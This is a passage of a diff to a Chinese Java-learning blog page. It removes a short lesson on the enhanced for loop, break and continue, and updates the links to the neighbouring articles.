-<p>主要用于数组或集合</p>
-</li>
-</ul>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(声明语句:表达式)&#123;</span><br><span class="line">    <span class="comment">//代码语句</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> x:numbers)&#123;		<span class="comment">//numbers为一个数组</span></span><br><span class="line">    System.out.println(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="break-amp-continue"><a href="#break-amp-continue" class="headerlink" title="break&amp;continue"></a>break&amp;continue</h4><p>break：强制结束循环，不执行循环中剩余的语句</p>
-<p>continue：用于跳过某次循环过程，接着进行下一次的是否执行循环判定</p>
-<h3 id=""><a href="#" class="headerlink" title=""></a></h3>
       
 
       
@@ -270,18 +228,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2023/03/28/JAVA_day04/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          JAVA学习_day04
-        
-      </div>
-    </a>
   
-  
-    <a href="/2023/03/28/JAVA_day02/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">JAVA学习_day02</div>
+    <a href="/2023/04/17/Java-Request/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Java_Request</div>
       <i class="icon-circle-right"></i>
     </a>
   
